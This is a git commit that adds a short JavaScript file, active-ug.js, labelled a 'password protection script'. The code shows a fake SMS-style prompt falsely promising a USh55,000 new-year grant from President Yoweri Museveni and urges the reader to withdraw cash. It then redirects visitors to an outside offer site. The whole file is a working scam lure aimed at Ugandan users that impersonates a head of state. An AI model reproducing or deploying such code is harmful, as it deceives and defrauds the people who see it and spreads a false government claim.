512270194894efdb6b10b76ca1b3c56547f5ab63
ukpeha2026-maker <ukpeha2026@gmail.com>
2025-12-29 08:55:05 +0100

    Create active-ug.js

---
+++ active-ug.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW USh55,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the USh55,000 new year Grant from the President Yoweri Museveni. Please press OK to withdraw CASH now.',
+  'WITHDRAW USh55,000'
+);
+if (password != 'WITHDRAW USh55,000') {
+  location.href = 'https://offres.org/new-year';
+}
